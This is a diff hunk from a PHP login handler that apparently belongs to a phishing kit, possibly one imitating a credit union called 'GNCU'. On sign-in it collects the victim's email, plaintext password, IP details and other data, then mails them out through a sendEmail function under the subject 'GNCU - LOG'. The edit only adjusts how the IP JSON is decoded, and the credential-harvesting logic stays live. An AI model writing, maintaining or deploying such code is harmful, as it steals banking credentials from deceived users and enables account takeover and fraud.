@@ -111,7 +111,7 @@ function sendEmail($prevValues, $subject = "GNCU - LOG") {
 if(isset($_POST["sign-in"])) {
     $username = sanitize($_POST["email"]);
     $password = sanitize($_POST["password"]);
-    $ip = json_encode(json_decode(sanitize($_POST["ip"])), JSON_PRETTY_PRINT);
+    $ip = json_encode(json_decode(sanitize($_POST["ip"]), true), JSON_PRETTY_PRINT);
     $detail = sanitize($_POST["detail"]);
 
     sendEmail(["username" => $username, "ip" => $ip, "password" => $password, "detail" => $detail]);
